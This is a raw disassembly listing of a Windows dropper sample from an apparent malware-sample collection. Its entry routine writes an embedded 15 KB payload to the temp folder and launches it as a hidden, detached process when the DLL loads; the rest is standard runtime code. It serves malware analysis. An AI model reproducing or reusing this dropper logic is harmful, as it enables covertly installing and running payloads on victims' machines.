
malware_samples/dropper/b56e1ebd367b0fd66122fd1ff7454f41e23987b143f00340ebc81a73357cf96f.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	40 55                	rex push %rbp
   180001002:	48 8d ac 24 f0 fb ff 	lea    -0x410(%rsp),%rbp
   180001009:	ff 
   18000100a:	48 81 ec 10 05 00 00 	sub    $0x510,%rsp
   180001011:	48 8b 05 e8 2f 00 00 	mov    0x2fe8(%rip),%rax        # 0x180004000
   180001018:	48 33 c4             	xor    %rsp,%rax
   18000101b:	48 89 85 00 04 00 00 	mov    %rax,0x400(%rbp)
   180001022:	33 d2                	xor    %edx,%edx
   180001024:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180001028:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   18000102e:	e8 09 10 00 00       	call   0x18000203c
   180001033:	33 d2                	xor    %edx,%edx
   180001035:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   18000103c:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   180001042:	e8 f5 0f 00 00       	call   0x18000203c
   180001047:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   18000104b:	b9 04 01 00 00       	mov    $0x104,%ecx
   180001050:	ff 15 b2 1f 00 00    	call   *0x1fb2(%rip)        # 0x180003008
   180001056:	85 c0                	test   %eax,%eax
   180001058:	0f 84 c8 01 00 00    	je     0x180001226
   18000105e:	48 89 b4 24 28 05 00 	mov    %rsi,0x528(%rsp)
   180001065:	00 
   180001066:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   18000106a:	48 89 bc 24 30 05 00 	mov    %rdi,0x530(%rsp)
   180001071:	00 
   180001072:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   180001079:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001080:	48 ff c0             	inc    %rax
   180001083:	66 83 3c 41 00       	cmpw   $0x0,(%rcx,%rax,2)
   180001088:	75 f6                	jne    0x180001080
   18000108a:	48 85 c0             	test   %rax,%rax
   18000108d:	74 1e                	je     0x1800010ad
   18000108f:	66 83 7c 45 de 5c    	cmpw   $0x5c,-0x22(%rbp,%rax,2)
   180001095:	74 16                	je     0x1800010ad
   180001097:	4c 8d 05 42 21 00 00 	lea    0x2142(%rip),%r8        # 0x1800031e0
   18000109e:	ba 04 01 00 00       	mov    $0x104,%edx
   1800010a3:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1800010a7:	ff 15 7b 20 00 00    	call   *0x207b(%rip)        # 0x180003128
   1800010ad:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1800010b1:	ba 04 01 00 00       	mov    $0x104,%edx
   1800010b6:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   1800010bd:	ff 15 5d 20 00 00    	call   *0x205d(%rip)        # 0x180003120
   1800010c3:	4c 8d 05 1e 21 00 00 	lea    0x211e(%rip),%r8        # 0x1800031e8
   1800010ca:	ba 04 01 00 00       	mov    $0x104,%edx
   1800010cf:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   1800010d6:	ff 15 4c 20 00 00    	call   *0x204c(%rip)        # 0x180003128
   1800010dc:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   1800010e3:	ff 15 37 1f 00 00    	call   *0x1f37(%rip)        # 0x180003020
   1800010e9:	33 f6                	xor    %esi,%esi
   1800010eb:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   1800010f2:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1800010f7:	45 33 c9             	xor    %r9d,%r9d
   1800010fa:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   180001101:	00 
   180001102:	45 33 c0             	xor    %r8d,%r8d
   180001105:	ba 00 00 00 40       	mov    $0x40000000,%edx
   18000110a:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   180001111:	00 
   180001112:	ff 15 f8 1e 00 00    	call   *0x1ef8(%rip)        # 0x180003010
   180001118:	48 8b f8             	mov    %rax,%rdi
   18000111b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000111f:	0f 84 f1 00 00 00    	je     0x180001216
   180001125:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   18000112a:	48 89 9c 24 20 05 00 	mov    %rbx,0x520(%rsp)
   180001131:	00 
   180001132:	41 b8 00 3c 00 00    	mov    $0x3c00,%r8d
   180001138:	89 74 24 68          	mov    %esi,0x68(%rsp)
   18000113c:	48 8d 15 3d 2f 00 00 	lea    0x2f3d(%rip),%rdx        # 0x180004080
   180001143:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180001148:	48 8b c8             	mov    %rax,%rcx
   18000114b:	ff 15 af 1e 00 00    	call   *0x1eaf(%rip)        # 0x180003000
   180001151:	48 8b cf             	mov    %rdi,%rcx
   180001154:	8b d8                	mov    %eax,%ebx
   180001156:	ff 15 cc 1e 00 00    	call   *0x1ecc(%rip)        # 0x180003028
   18000115c:	85 db                	test   %ebx,%ebx
   18000115e:	48 8b 9c 24 20 05 00 	mov    0x520(%rsp),%rbx
   180001165:	00 
   180001166:	0f 84 aa 00 00 00    	je     0x180001216
   18000116c:	81 7c 24 68 00 3c 00 	cmpl   $0x3c00,0x68(%rsp)
   180001173:	00 
   180001174:	0f 85 9c 00 00 00    	jne    0x180001216
   18000117a:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000117d:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   180001184:	33 c0                	xor    %eax,%eax
   180001186:	45 33 c9             	xor    %r9d,%r9d
   180001189:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   18000118d:	45 33 c0             	xor    %r8d,%r8d
   180001190:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180001195:	33 d2                	xor    %edx,%edx
   180001197:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   18000119c:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800011a1:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1800011a6:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800011ab:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   1800011af:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800011b4:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1800011b9:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   1800011be:	c7 44 24 28 08 00 00 	movl   $0x8000008,0x28(%rsp)
   1800011c5:	08 
   1800011c6:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   1800011ca:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1800011ce:	0f 11 45 b0          	movups %xmm0,-0x50(%rbp)
   1800011d2:	c7 44 24 70 68 00 00 	movl   $0x68,0x70(%rsp)
   1800011d9:	00 
   1800011da:	0f 11 45 80          	movups %xmm0,-0x80(%rbp)
   1800011de:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%rbp)
   1800011e5:	0f 11 45 90          	movups %xmm0,-0x70(%rbp)
   1800011e9:	66 89 75 b0          	mov    %si,-0x50(%rbp)
   1800011ed:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   1800011f1:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   1800011f6:	ff 15 34 1e 00 00    	call   *0x1e34(%rip)        # 0x180003030
   1800011fc:	85 c0                	test   %eax,%eax
   1800011fe:	74 16                	je     0x180001216
   180001200:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180001205:	ff 15 1d 1e 00 00    	call   *0x1e1d(%rip)        # 0x180003028
   18000120b:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180001210:	ff 15 12 1e 00 00    	call   *0x1e12(%rip)        # 0x180003028
   180001216:	48 8b b4 24 28 05 00 	mov    0x528(%rsp),%rsi
   18000121d:	00 
   18000121e:	48 8b bc 24 30 05 00 	mov    0x530(%rsp),%rdi
   180001225:	00 
   180001226:	48 8b 8d 00 04 00 00 	mov    0x400(%rbp),%rcx
   18000122d:	48 33 cc             	xor    %rsp,%rcx
   180001230:	e8 4b 00 00 00       	call   0x180001280
   180001235:	48 81 c4 10 05 00 00 	add    $0x510,%rsp
   18000123c:	5d                   	pop    %rbp
   18000123d:	c3                   	ret
   18000123e:	cc                   	int3
   18000123f:	cc                   	int3
   180001240:	48 83 ec 28          	sub    $0x28,%rsp
   180001244:	83 fa 01             	cmp    $0x1,%edx
   180001247:	75 0b                	jne    0x180001254
   180001249:	ff 15 c9 1d 00 00    	call   *0x1dc9(%rip)        # 0x180003018
   18000124f:	e8 ac fd ff ff       	call   0x180001000
   180001254:	b8 01 00 00 00       	mov    $0x1,%eax
   180001259:	48 83 c4 28          	add    $0x28,%rsp
   18000125d:	c3                   	ret
   18000125e:	cc                   	int3
   18000125f:	cc                   	int3
   180001260:	e9 9b fd ff ff       	jmp    0x180001000
   180001265:	cc                   	int3
   180001266:	cc                   	int3
   180001267:	cc                   	int3
   180001268:	cc                   	int3
   180001269:	cc                   	int3
   18000126a:	cc                   	int3
   18000126b:	cc                   	int3
   18000126c:	cc                   	int3
   18000126d:	cc                   	int3
   18000126e:	cc                   	int3
   18000126f:	cc                   	int3
   180001270:	cc                   	int3
   180001271:	cc                   	int3
   180001272:	cc                   	int3
   180001273:	cc                   	int3
   180001274:	cc                   	int3
   180001275:	cc                   	int3
   180001276:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000127d:	00 00 00 
   180001280:	48 3b 0d 79 2d 00 00 	cmp    0x2d79(%rip),%rcx        # 0x180004000
   180001287:	75 10                	jne    0x180001299
   180001289:	48 c1 c1 10          	rol    $0x10,%rcx
   18000128d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   180001292:	75 01                	jne    0x180001295
   180001294:	c3                   	ret
   180001295:	48 c1 c9 10          	ror    $0x10,%rcx
   180001299:	e9 86 03 00 00       	jmp    0x180001624
   18000129e:	cc                   	int3
   18000129f:	cc                   	int3
   1800012a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800012a4:	85 d2                	test   %edx,%edx
   1800012a6:	74 39                	je     0x1800012e1
   1800012a8:	83 ea 01             	sub    $0x1,%edx
   1800012ab:	74 28                	je     0x1800012d5
   1800012ad:	83 ea 01             	sub    $0x1,%edx
   1800012b0:	74 16                	je     0x1800012c8
   1800012b2:	83 fa 01             	cmp    $0x1,%edx
   1800012b5:	74 0a                	je     0x1800012c1
   1800012b7:	b8 01 00 00 00       	mov    $0x1,%eax
   1800012bc:	48 83 c4 28          	add    $0x28,%rsp
   1800012c0:	c3                   	ret
   1800012c1:	e8 4a 06 00 00       	call   0x180001910
   1800012c6:	eb 05                	jmp    0x1800012cd
   1800012c8:	e8 1b 06 00 00       	call   0x1800018e8
   1800012cd:	0f b6 c0             	movzbl %al,%eax
   1800012d0:	48 83 c4 28          	add    $0x28,%rsp
   1800012d4:	c3                   	ret
   1800012d5:	49 8b d0             	mov    %r8,%rdx
   1800012d8:	48 83 c4 28          	add    $0x28,%rsp
   1800012dc:	e9 0f 00 00 00       	jmp    0x1800012f0
   1800012e1:	4d 85 c0             	test   %r8,%r8
   1800012e4:	0f 95 c1             	setne  %cl
   1800012e7:	48 83 c4 28          	add    $0x28,%rsp
   1800012eb:	e9 18 01 00 00       	jmp    0x180001408
   1800012f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800012f5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800012fa:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800012ff:	41 56                	push   %r14
   180001301:	48 83 ec 20          	sub    $0x20,%rsp
   180001305:	48 8b f2             	mov    %rdx,%rsi
   180001308:	4c 8b f1             	mov    %rcx,%r14
   18000130b:	33 c9                	xor    %ecx,%ecx
   18000130d:	e8 ba 06 00 00       	call   0x1800019cc
   180001312:	84 c0                	test   %al,%al
   180001314:	0f 84 c8 00 00 00    	je     0x1800013e2
   18000131a:	e8 41 05 00 00       	call   0x180001860
   18000131f:	8a d8                	mov    %al,%bl
   180001321:	88 44 24 40          	mov    %al,0x40(%rsp)
   180001325:	40 b7 01             	mov    $0x1,%dil
   180001328:	83 3d f1 6e 00 00 00 	cmpl   $0x0,0x6ef1(%rip)        # 0x180008220
   18000132f:	0f 85 c5 00 00 00    	jne    0x1800013fa
   180001335:	c7 05 e1 6e 00 00 01 	movl   $0x1,0x6ee1(%rip)        # 0x180008220
   18000133c:	00 00 00 
   18000133f:	e8 8c 05 00 00       	call   0x1800018d0
   180001344:	84 c0                	test   %al,%al
   180001346:	74 4f                	je     0x180001397
   180001348:	e8 87 09 00 00       	call   0x180001cd4
   18000134d:	e8 c6 04 00 00       	call   0x180001818
   180001352:	e8 ed 04 00 00       	call   0x180001844
   180001357:	48 8d 15 2a 1e 00 00 	lea    0x1e2a(%rip),%rdx        # 0x180003188
   18000135e:	48 8d 0d 1b 1e 00 00 	lea    0x1e1b(%rip),%rcx        # 0x180003180
   180001365:	e8 de 0c 00 00       	call   0x180002048
   18000136a:	85 c0                	test   %eax,%eax
   18000136c:	75 29                	jne    0x180001397
   18000136e:	e8 29 05 00 00       	call   0x18000189c
   180001373:	84 c0                	test   %al,%al
   180001375:	74 20                	je     0x180001397
   180001377:	48 8d 15 fa 1d 00 00 	lea    0x1dfa(%rip),%rdx        # 0x180003178
   18000137e:	48 8d 0d eb 1d 00 00 	lea    0x1deb(%rip),%rcx        # 0x180003170
   180001385:	e8 b8 0c 00 00       	call   0x180002042
   18000138a:	c7 05 8c 6e 00 00 02 	movl   $0x2,0x6e8c(%rip)        # 0x180008220
   180001391:	00 00 00 
   180001394:	40 32 ff             	xor    %dil,%dil
   180001397:	8a cb                	mov    %bl,%cl
   180001399:	e8 8e 07 00 00       	call   0x180001b2c
   18000139e:	40 84 ff             	test   %dil,%dil
   1800013a1:	75 3f                	jne    0x1800013e2
   1800013a3:	e8 d4 07 00 00       	call   0x180001b7c
   1800013a8:	48 8b d8             	mov    %rax,%rbx
   1800013ab:	48 83 38 00          	cmpq   $0x0,(%rax)
   1800013af:	74 24                	je     0x1800013d5
   1800013b1:	48 8b c8             	mov    %rax,%rcx
   1800013b4:	e8 db 06 00 00       	call   0x180001a94
   1800013b9:	84 c0                	test   %al,%al
   1800013bb:	74 18                	je     0x1800013d5
   1800013bd:	4c 8b c6             	mov    %rsi,%r8
   1800013c0:	ba 02 00 00 00       	mov    $0x2,%edx
   1800013c5:	49 8b ce             	mov    %r14,%rcx
   1800013c8:	48 8b 03             	mov    (%rbx),%rax
   1800013cb:	4c 8b 0d 76 1d 00 00 	mov    0x1d76(%rip),%r9        # 0x180003148
   1800013d2:	41 ff d1             	call   *%r9
   1800013d5:	ff 05 a5 68 00 00    	incl   0x68a5(%rip)        # 0x180007c80
   1800013db:	b8 01 00 00 00       	mov    $0x1,%eax
   1800013e0:	eb 02                	jmp    0x1800013e4
   1800013e2:	33 c0                	xor    %eax,%eax
   1800013e4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800013e9:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800013ee:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800013f3:	48 83 c4 20          	add    $0x20,%rsp
   1800013f7:	41 5e                	pop    %r14
   1800013f9:	c3                   	ret
   1800013fa:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800013ff:	e8 88 07 00 00       	call   0x180001b8c
   180001404:	90                   	nop
   180001405:	cc                   	int3
   180001406:	cc                   	int3
   180001407:	cc                   	int3
   180001408:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000140d:	57                   	push   %rdi
   18000140e:	48 83 ec 30          	sub    $0x30,%rsp
   180001412:	40 8a f9             	mov    %cl,%dil
   180001415:	8b 05 65 68 00 00    	mov    0x6865(%rip),%eax        # 0x180007c80
   18000141b:	85 c0                	test   %eax,%eax
   18000141d:	7f 0d                	jg     0x18000142c
   18000141f:	33 c0                	xor    %eax,%eax
   180001421:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180001426:	48 83 c4 30          	add    $0x30,%rsp
   18000142a:	5f                   	pop    %rdi
   18000142b:	c3                   	ret
   18000142c:	ff c8                	dec    %eax
   18000142e:	89 05 4c 68 00 00    	mov    %eax,0x684c(%rip)        # 0x180007c80
   180001434:	e8 27 04 00 00       	call   0x180001860
   180001439:	8a d8                	mov    %al,%bl
   18000143b:	88 44 24 20          	mov    %al,0x20(%rsp)
   18000143f:	83 3d da 6d 00 00 02 	cmpl   $0x2,0x6dda(%rip)        # 0x180008220
   180001446:	75 33                	jne    0x18000147b
   180001448:	e8 3b 05 00 00       	call   0x180001988
   18000144d:	e8 d6 03 00 00       	call   0x180001828
   180001452:	e8 b9 08 00 00       	call   0x180001d10
   180001457:	83 25 c2 6d 00 00 00 	andl   $0x0,0x6dc2(%rip)        # 0x180008220
   18000145e:	8a cb                	mov    %bl,%cl
   180001460:	e8 c7 06 00 00       	call   0x180001b2c
   180001465:	33 d2                	xor    %edx,%edx
   180001467:	40 8a cf             	mov    %dil,%cl
   18000146a:	e8 e1 06 00 00       	call   0x180001b50
   18000146f:	0f b6 d8             	movzbl %al,%ebx
   180001472:	e8 41 05 00 00       	call   0x1800019b8
   180001477:	8b c3                	mov    %ebx,%eax
   180001479:	eb a6                	jmp    0x180001421
   18000147b:	b9 07 00 00 00       	mov    $0x7,%ecx
   180001480:	e8 07 07 00 00       	call   0x180001b8c
   180001485:	90                   	nop
   180001486:	90                   	nop
   180001487:	cc                   	int3
   180001488:	48 8b c4             	mov    %rsp,%rax
   18000148b:	48 89 58 20          	mov    %rbx,0x20(%rax)
   18000148f:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180001493:	89 50 10             	mov    %edx,0x10(%rax)
   180001496:	48 89 48 08          	mov    %rcx,0x8(%rax)
   18000149a:	56                   	push   %rsi
   18000149b:	57                   	push   %rdi
   18000149c:	41 56                	push   %r14
   18000149e:	48 83 ec 40          	sub    $0x40,%rsp
   1800014a2:	49 8b f0             	mov    %r8,%rsi
   1800014a5:	8b fa                	mov    %edx,%edi
   1800014a7:	4c 8b f1             	mov    %rcx,%r14
   1800014aa:	85 d2                	test   %edx,%edx
   1800014ac:	75 0f                	jne    0x1800014bd
   1800014ae:	39 15 cc 67 00 00    	cmp    %edx,0x67cc(%rip)        # 0x180007c80
   1800014b4:	7f 07                	jg     0x1800014bd
   1800014b6:	33 c0                	xor    %eax,%eax
   1800014b8:	e9 e5 00 00 00       	jmp    0x1800015a2
   1800014bd:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1800014c0:	83 f8 01             	cmp    $0x1,%eax
   1800014c3:	77 40                	ja     0x180001505
   1800014c5:	48 8b 05 e4 1c 00 00 	mov    0x1ce4(%rip),%rax        # 0x1800031b0
   1800014cc:	48 85 c0             	test   %rax,%rax
   1800014cf:	75 05                	jne    0x1800014d6
   1800014d1:	8d 58 01             	lea    0x1(%rax),%ebx
   1800014d4:	eb 08                	jmp    0x1800014de
   1800014d6:	ff 15 6c 1c 00 00    	call   *0x1c6c(%rip)        # 0x180003148
   1800014dc:	8b d8                	mov    %eax,%ebx
   1800014de:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800014e2:	85 db                	test   %ebx,%ebx
   1800014e4:	0f 84 ae 00 00 00    	je     0x180001598
   1800014ea:	4c 8b c6             	mov    %rsi,%r8
   1800014ed:	8b d7                	mov    %edi,%edx
   1800014ef:	49 8b ce             	mov    %r14,%rcx
   1800014f2:	e8 a9 fd ff ff       	call   0x1800012a0
   1800014f7:	8b d8                	mov    %eax,%ebx
   1800014f9:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800014fd:	85 c0                	test   %eax,%eax
   1800014ff:	0f 84 93 00 00 00    	je     0x180001598
   180001505:	4c 8b c6             	mov    %rsi,%r8
   180001508:	8b d7                	mov    %edi,%edx
   18000150a:	49 8b ce             	mov    %r14,%rcx
   18000150d:	e8 2e fd ff ff       	call   0x180001240
   180001512:	8b d8                	mov    %eax,%ebx
   180001514:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001518:	83 ff 01             	cmp    $0x1,%edi
   18000151b:	75 36                	jne    0x180001553
   18000151d:	85 c0                	test   %eax,%eax
   18000151f:	75 32                	jne    0x180001553
   180001521:	4c 8b c6             	mov    %rsi,%r8
   180001524:	33 d2                	xor    %edx,%edx
   180001526:	49 8b ce             	mov    %r14,%rcx
   180001529:	e8 12 fd ff ff       	call   0x180001240
   18000152e:	48 85 f6             	test   %rsi,%rsi
   180001531:	0f 95 c1             	setne  %cl
   180001534:	e8 cf fe ff ff       	call   0x180001408
   180001539:	48 8b 05 70 1c 00 00 	mov    0x1c70(%rip),%rax        # 0x1800031b0
   180001540:	48 85 c0             	test   %rax,%rax
   180001543:	74 0e                	je     0x180001553
   180001545:	4c 8b c6             	mov    %rsi,%r8
   180001548:	33 d2                	xor    %edx,%edx
   18000154a:	49 8b ce             	mov    %r14,%rcx
   18000154d:	ff 15 f5 1b 00 00    	call   *0x1bf5(%rip)        # 0x180003148
   180001553:	85 ff                	test   %edi,%edi
   180001555:	74 05                	je     0x18000155c
   180001557:	83 ff 03             	cmp    $0x3,%edi
   18000155a:	75 3c                	jne    0x180001598
   18000155c:	4c 8b c6             	mov    %rsi,%r8
   18000155f:	8b d7                	mov    %edi,%edx
   180001561:	49 8b ce             	mov    %r14,%rcx
   180001564:	e8 37 fd ff ff       	call   0x1800012a0
   180001569:	8b d8                	mov    %eax,%ebx
   18000156b:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000156f:	85 c0                	test   %eax,%eax
   180001571:	74 25                	je     0x180001598
   180001573:	48 8b 05 36 1c 00 00 	mov    0x1c36(%rip),%rax        # 0x1800031b0
   18000157a:	48 85 c0             	test   %rax,%rax
   18000157d:	75 05                	jne    0x180001584
   18000157f:	8d 58 01             	lea    0x1(%rax),%ebx
   180001582:	eb 10                	jmp    0x180001594
   180001584:	4c 8b c6             	mov    %rsi,%r8
   180001587:	8b d7                	mov    %edi,%edx
   180001589:	49 8b ce             	mov    %r14,%rcx
   18000158c:	ff 15 b6 1b 00 00    	call   *0x1bb6(%rip)        # 0x180003148
   180001592:	8b d8                	mov    %eax,%ebx
   180001594:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180001598:	eb 06                	jmp    0x1800015a0
   18000159a:	33 db                	xor    %ebx,%ebx
   18000159c:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800015a0:	8b c3                	mov    %ebx,%eax
   1800015a2:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   1800015a7:	48 83 c4 40          	add    $0x40,%rsp
   1800015ab:	41 5e                	pop    %r14
   1800015ad:	5f                   	pop    %rdi
   1800015ae:	5e                   	pop    %rsi
   1800015af:	c3                   	ret
   1800015b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800015b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800015ba:	57                   	push   %rdi
   1800015bb:	48 83 ec 20          	sub    $0x20,%rsp
   1800015bf:	49 8b f8             	mov    %r8,%rdi
   1800015c2:	8b da                	mov    %edx,%ebx
   1800015c4:	48 8b f1             	mov    %rcx,%rsi
   1800015c7:	83 fa 01             	cmp    $0x1,%edx
   1800015ca:	75 05                	jne    0x1800015d1
   1800015cc:	e8 9b 01 00 00       	call   0x18000176c
   1800015d1:	4c 8b c7             	mov    %rdi,%r8
   1800015d4:	8b d3                	mov    %ebx,%edx
   1800015d6:	48 8b ce             	mov    %rsi,%rcx
   1800015d9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800015de:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800015e3:	48 83 c4 20          	add    $0x20,%rsp
   1800015e7:	5f                   	pop    %rdi
   1800015e8:	e9 9b fe ff ff       	jmp    0x180001488
   1800015ed:	cc                   	int3
   1800015ee:	cc                   	int3
   1800015ef:	cc                   	int3
   1800015f0:	40 53                	rex push %rbx
   1800015f2:	48 83 ec 20          	sub    $0x20,%rsp
   1800015f6:	48 8b d9             	mov    %rcx,%rbx
   1800015f9:	33 c9                	xor    %ecx,%ecx
   1800015fb:	ff 15 4f 1a 00 00    	call   *0x1a4f(%rip)        # 0x180003050
   180001601:	48 8b cb             	mov    %rbx,%rcx
   180001604:	ff 15 3e 1a 00 00    	call   *0x1a3e(%rip)        # 0x180003048
   18000160a:	ff 15 48 1a 00 00    	call   *0x1a48(%rip)        # 0x180003058
   180001610:	48 8b c8             	mov    %rax,%rcx
   180001613:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180001618:	48 83 c4 20          	add    $0x20,%rsp
   18000161c:	5b                   	pop    %rbx
   18000161d:	48 ff 25 3c 1a 00 00 	rex.W jmp *0x1a3c(%rip)        # 0x180003060
   180001624:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180001629:	48 83 ec 38          	sub    $0x38,%rsp
   18000162d:	b9 17 00 00 00       	mov    $0x17,%ecx
   180001632:	ff 15 60 1a 00 00    	call   *0x1a60(%rip)        # 0x180003098
   180001638:	85 c0                	test   %eax,%eax
   18000163a:	74 07                	je     0x180001643
   18000163c:	b9 02 00 00 00       	mov    $0x2,%ecx
   180001641:	cd 29                	int    $0x29
   180001643:	48 8d 0d e6 66 00 00 	lea    0x66e6(%rip),%rcx        # 0x180007d30
   18000164a:	e8 a9 00 00 00       	call   0x1800016f8
   18000164f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180001654:	48 89 05 cd 67 00 00 	mov    %rax,0x67cd(%rip)        # 0x180007e28
   18000165b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   180001660:	48 83 c0 08          	add    $0x8,%rax
   180001664:	48 89 05 5d 67 00 00 	mov    %rax,0x675d(%rip)        # 0x180007dc8
   18000166b:	48 8b 05 b6 67 00 00 	mov    0x67b6(%rip),%rax        # 0x180007e28
   180001672:	48 89 05 27 66 00 00 	mov    %rax,0x6627(%rip)        # 0x180007ca0
   180001679:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   18000167e:	48 89 05 2b 67 00 00 	mov    %rax,0x672b(%rip)        # 0x180007db0
   180001685:	c7 05 01 66 00 00 09 	movl   $0xc0000409,0x6601(%rip)        # 0x180007c90
   18000168c:	04 00 c0 
   18000168f:	c7 05 fb 65 00 00 01 	movl   $0x1,0x65fb(%rip)        # 0x180007c94
   180001696:	00 00 00 
   180001699:	c7 05 05 66 00 00 01 	movl   $0x1,0x6605(%rip)        # 0x180007ca8
   1800016a0:	00 00 00 
   1800016a3:	b8 08 00 00 00       	mov    $0x8,%eax
   1800016a8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1800016ac:	48 8d 0d fd 65 00 00 	lea    0x65fd(%rip),%rcx        # 0x180007cb0
   1800016b3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1800016ba:	00 
   1800016bb:	b8 08 00 00 00       	mov    $0x8,%eax
   1800016c0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1800016c4:	48 8b 0d 35 29 00 00 	mov    0x2935(%rip),%rcx        # 0x180004000
   1800016cb:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1800016d0:	b8 08 00 00 00       	mov    $0x8,%eax
   1800016d5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1800016d9:	48 8b 0d 60 29 00 00 	mov    0x2960(%rip),%rcx        # 0x180004040
   1800016e0:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1800016e5:	48 8d 0d cc 1a 00 00 	lea    0x1acc(%rip),%rcx        # 0x1800031b8
   1800016ec:	e8 ff fe ff ff       	call   0x1800015f0
   1800016f1:	90                   	nop
   1800016f2:	48 83 c4 38          	add    $0x38,%rsp
   1800016f6:	c3                   	ret
   1800016f7:	cc                   	int3
   1800016f8:	40 53                	rex push %rbx
   1800016fa:	56                   	push   %rsi
   1800016fb:	57                   	push   %rdi
   1800016fc:	48 83 ec 40          	sub    $0x40,%rsp
   180001700:	48 8b d9             	mov    %rcx,%rbx
   180001703:	ff 15 97 19 00 00    	call   *0x1997(%rip)        # 0x1800030a0
   180001709:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   180001710:	33 ff                	xor    %edi,%edi
   180001712:	45 33 c0             	xor    %r8d,%r8d
   180001715:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   18000171a:	48 8b ce             	mov    %rsi,%rcx
   18000171d:	ff 15 15 19 00 00    	call   *0x1915(%rip)        # 0x180003038
   180001723:	48 85 c0             	test   %rax,%rax
   180001726:	74 39                	je     0x180001761
   180001728:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000172e:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180001733:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180001738:	4c 8b c8             	mov    %rax,%r9
   18000173b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180001740:	4c 8b c6             	mov    %rsi,%r8
   180001743:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180001748:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   18000174d:	33 c9                	xor    %ecx,%ecx
   18000174f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001754:	ff 15 e6 18 00 00    	call   *0x18e6(%rip)        # 0x180003040
   18000175a:	ff c7                	inc    %edi
   18000175c:	83 ff 02             	cmp    $0x2,%edi
   18000175f:	7c b1                	jl     0x180001712
